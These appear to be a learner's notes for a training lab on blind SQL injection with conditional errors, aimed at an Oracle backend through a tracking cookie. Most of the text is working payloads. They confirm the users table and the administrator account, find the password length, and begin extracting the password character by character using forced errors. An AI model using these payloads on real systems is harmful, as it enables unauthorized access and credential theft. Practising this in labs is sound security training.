Lab 12 - Blind SQL injection with conditional errors

Vulnerable parameter - tracking cookie

End goals - 
    1 . Output the password of the administrator
    2. Log in as the administrator user

Analysis:
    Testing for blind based injection - find out how application is responses to true usecase and false usecase. If the application responses differently on both the usecases, then we can successfully exploit the application with blind SQLi.

    1. Prove that the parameter is vulnerable to blind SQLi
        ' || (SELECT '') || ' => Internal server error even though the query is correct, so database may be oracle
        
        ' || (SELECT '' FROM dual) || ' => Oracle database

        ' || (SELECT '' FROM dual123) || ' => error

    2. Confirm that the users table exists in the database
        ' || (SELECT '' FROM users WHERE rownum=1) || ' => 200 response => users table exists

    3. Confirm that the 'administrator' user exists in the users database
         ' || (SELECT '' FROM users WHERE username='administrator') || ' => return 200 for user exist and not exist => can't differciate => use below approach

         ' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

         ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' => Internal server error => 'administrator' user exists

         ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator12') || ' => 200 response => 'administrator12' user doesn't exists

    4. Find the length of the password
        ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > 1) || '

        password length = 20

    5. Output the administrator password
        first letter = a? 
        ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') || '